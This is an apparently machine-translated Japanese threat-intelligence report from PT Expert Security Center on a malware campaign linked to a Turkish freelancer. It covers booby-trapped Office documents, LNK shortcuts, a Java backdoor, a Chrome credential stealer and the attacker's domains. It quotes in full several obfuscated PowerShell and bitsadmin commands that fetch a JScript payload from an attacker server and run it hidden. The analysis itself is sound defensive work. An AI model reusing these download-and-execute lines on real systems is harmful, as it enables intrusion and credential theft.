ワーム、ネズミ、そしてフリーランサーによるトルコのトリック

Positive Technologies Security Center（PT Expert Security Center）の脅威研究グループのスペシャリストは、少なくとも2018年1月中旬以降アクティブな悪意のあるキャンペーンを発見しました。このオペレーションは、ブラジル、イギリス、ハンガリー、ドイツ、ラトビア、アメリカ、トルコ、フィリピンのユーザーを対象としています。被害者のPCに感染して制御するために、さまざまなツールと手法が使用されています。このレポートでは、感染の段階、使用されたユーティリティ、ネットワークインフラストラクチャを整理する機能、およびハッカー候補になるまでのデジタルトレースについて詳しく説明します。

概要


  • 攻撃者は、10年前に最新の手法を考慮してワームを処理しました
  • 広範なネットワークインフラストラクチャと組み合わせて使用​​されるツールの動物園
  • 主な容疑者はトルコのフリーランサーです

ペイロード配信


オフィス文書


2019年4月5日に、新しい脅威を追跡する一環として、PT Expert Security Centerの専門家が不審なオフィス文書を発見しました。拡張子が.docmのファイル（マクロをサポートする新しいサンプルのMS Word文書）：

  • 発見の数日前に作成（2019-03-31）、
  • ユーザーにマクロを有効にするよう説得するための画像が含まれている、
  • はトルコ語のシステムで作成されました（これはメタデータフィールドの値によって示されます：「KonuBaşlığı」-「テーマのタイトル」、「Konu Ba l、1」-「件名見出し、1」。Google翻訳の翻訳）。



図。1.マクロを含める必要があることを通知する一般的なトラップ。

マクロコードは少し難読化されていますが、簡潔です。PowerShellのバックグラウンドインテリジェント転送管理（BITS）コマンドレットを使用して、攻撃者のサーバーからJScriptにスクリプトを読み込み、実行します。

Shell ("pow" & "ershe" & "ll -comm" & "and ""$h1='e';&('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb1.js;');Start-Process -WindowStyle hidden -FilePath 'cmd.exe' -ArgumentList '/c %systemroot%\system32\wscript %temp%\bb1.js'""")

PowerShellとWebサーバーからファイルをダウンロードするための非定型モジュールを使用するのは、信頼できないプログラムの起動と実行に関する制限を回避しようとするためです。

同様のドキュメントがいくつかあります。たとえば、そのうちの1つは、トルコ語の文字コードページを含む.docファイル（古いスタイルのMS Word文書）です。マクロの作業も非常に似ています。

Shell "cmd.exe /c bitsadmin /transfer myjob /download /priority FOREGROUND https://definebilimi.com/up3e.js %temp%\o2.js & wscript.exe %temp%\o2.js", vbHide

この場合、作成者は同じBITSテクノロジを使用しますが、正当なシステムユーティリティであるbitsadminを利用します。興味深いことに、文書が作成された日付と公的な情報源で発見された時刻の両方が、2018年7月中旬までに送信されます。したがって、攻撃は少なくとも約1年間は関係があります。さらに、同じ攻撃者サーバーがペイロードのダウンロードに使用されます。JScriptでロード可能なスクリプトに名前を付ける方法は似ています。

別のドキュメントの拡張子は.rtf（リッチテキスト形式）です。同じコンテンツを持ついくつかの.xls-documents（古いスタイルのMS Excelドキュメント）が埋め込まれています。マクロコードは元のドキュメントから抽出されたものと完全に同一であり、コードページの値とHeadingPairs XMLフィールドの一致により、同じ作成者が導き出されます。

LNKショートカット


このキャンペーンでは、感染の初期段階としてオフィス文書だけが使用されたわけではないことは注目に値します。悪意のある.lnkファイル（Windows Shell Link）をいくつか見つけました。起動すると、次のコマンドが実行されました。

C:\Windows\System32\cmd.exe /c powershell -command "$h1='e';&('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb.js;')" & %systemroot%\system32\wscript %temp%\bb.js

ラベルは2019年3月中旬と4月下旬に配布されました。

ショートカットメタデータには、ユーザー名win7-bilgisayar（トルコ語の「win7-computer」から）、つまりユーザー名が作成されたシステムのユーザーが含まれています。

フィッシングメールは、感染の最初の段階で悪意のあるファイルを配信する最も可能性の高いシナリオであると想定できます。

ブコープジャー


自作の軽量Javaバックドア。ポート22122でTCPを介してC＆Cと対話します。次のことができます。

  • cmd.exeインタープリターでコマンドを実行します。
  • システムのバージョンを確認する
  • ディレクトリの一覧表示
  • ファイルをアップロードする
  • スタートアップディレクトリとレジストリスタートアップブランチに登録します。

Get-chromecreds


Chromeブラウザーから履歴、ログイン、パスワード、Cookieを抽出するためのPowerShellラッパー。一部のバージョンには、base64でエンコードされた形式のx86およびx64システム用のヘルパーライブラリSystem.Data.SQLite.dllが含まれていますが、％APPDATA％ディレクトリに存在すると想定しています。このコンポーネントは、メインのJScriptバックドア用の補助プラグインとして提供されます。

bcorp.fun


ドメインは2019年3月23日から登録されています。トルコが再び国として登録されているという事実に加えて、Bcorpはクライアント組織としてリストされています。実際、前のいくつかの段落と同じように、ドメイン名自体にも同じことが見られます。

husan2.ddns.net


攻撃者が古典的な方法だけでなくホストを取得することは奇妙です。2019年3月中旬以降、いわゆるダイナミックDNSサーバーの使用が記録されています。この技術により、攻撃者はIPアドレスを効果的に隠し、コントロールセンターの活力を確保できます。名前の選択にはある程度の予測可能性があることに注意してください。たとえば、数か月後にhusan3.ddns.netドメインの使用が発見されましたが、husan.ddns.netドメインの活動は2017年4月に遡ります。

bkorp.xyz


4月上旬以降、ハッカーは匿名化の道を歩み続け、パナマにあるWhoisGuard、Inc.サービスを使用してドメインを登録します。bkorp.xyz、prntsrcn.com、i37-imgur.comはほんの一例です。使用されているNSサーバーは、それらを他の悪意のあるドメインにリンクしています。

qqww.eu


このドメインには、ドメインbcorp.funのようにサブドメインip1があるという事実に加えて、もう1つ重要な詳細があります。登録者に関する情報は、ベルリンにあるとされる組織Osbil Technology Ltd.を示しています。実際、同じ名前の組織は、ファマグスタ市のキプロス沿岸にあります-北キプロスの部分的に認められたトルコ共和国の領土。そして、同社の公式ウェブサイトは、 2019年3月から5月までのドメインbcorp.funのNSサーバーであるドメインにあります。ネームサーバーのセキュリティ侵害の兆候は見られず、NSプロバイダーのインフラストラクチャ機能（登録者列のプロバイダーデータでクライアントを置き換える）により、クライアント情報をパブリックアクセスから隠すことが可能になりました。
